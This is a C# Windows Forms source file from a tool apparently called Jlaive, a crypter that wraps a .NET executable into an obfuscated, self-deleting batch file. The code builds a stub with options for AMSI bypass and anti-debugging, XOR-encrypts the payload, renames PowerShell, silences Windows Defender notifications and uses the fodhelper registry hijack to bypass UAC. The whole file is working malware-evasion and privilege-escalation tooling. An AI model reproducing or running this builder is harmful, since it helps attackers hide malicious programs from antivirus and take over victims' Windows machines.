using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            buildButton.Enabled = false;
            string path = textBox1.Text;
            if (!File.Exists(path))
            {
                MessageBox.Show("Invalid input file path!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }  
            if (!IsAssembly(path))
            {
                MessageBox.Show("Input file not valid assembly!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }

            Random rng = new Random();

            byte[] pbytes = File.ReadAllBytes(path);
            string stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
            string tempfile = Path.GetTempFileName();
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete(tempfile);

            string key = RandomString(20, rng);
            byte[] encrypted = XORCrypt(Compress(stubbytes), key);
            string command = StubGen.CreatePS(key, hidden.Checked, rng);

            StringBuilder toobf = new StringBuilder();
            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
            toobf.AppendLine("cls");
            if (bypassUAC.Checked)
            {
                toobf.AppendLine(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f");
                toobf.AppendLine(@"cmd /c reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d %p% /f");
                toobf.AppendLine("fodhelper");
                toobf.AppendLine(@"reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f");
                toobf.AppendLine(@"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f");
            }
            else toobf.AppendLine(command);
            toobf.Append("del pshell.exe");
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");
            if (bypassUAC.Checked) output.AppendLine($"set \"p=^\"%~dp0{command}^\"\"");
            if (obfuscate.Checked) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
            else output.AppendLine(toobf.ToString());
            if (selfDelete.Checked) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit");
            output.Append(Convert.ToBase64String(encrypted));

            string outputpath = Path.ChangeExtension(path, "bat");
            File.WriteAllText(outputpath, output.ToString(), Encoding.ASCII);

            MessageBox.Show($"Build successful!\nOutput path: {outputpath}", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
            buildButton.Enabled = true;
        }
    }
}